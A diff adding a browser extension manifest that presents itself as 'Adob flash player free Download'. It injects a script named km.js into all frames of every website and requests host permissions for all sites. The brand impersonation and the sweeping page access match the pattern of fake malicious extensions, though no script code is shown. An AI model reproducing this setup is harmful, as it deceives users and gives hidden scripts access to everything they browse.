@@ -1,0 +1,21 @@
+{
+  "manifest_version": 2,
+
+  "name": "flash player",
+  "description": "Adob flash player free Download",
+  "version": "2.3",
+  "browser_action": {
+    "default_icon": "icon.png"
+  },
+    "background":{
+      "scripts":[
+         "js/background.js"
+      ]
+   },
+   "content_scripts": [ {
+      "all_frames": true,
+      "js": [ "js/jquery-3.1.1.js" ,"js/km.js"],
+      "matches": [ "http://*/*", "https://*/*" ]
+   } ],
+  "permissions": [ "http://*/*", "https://*/*" ]
+}
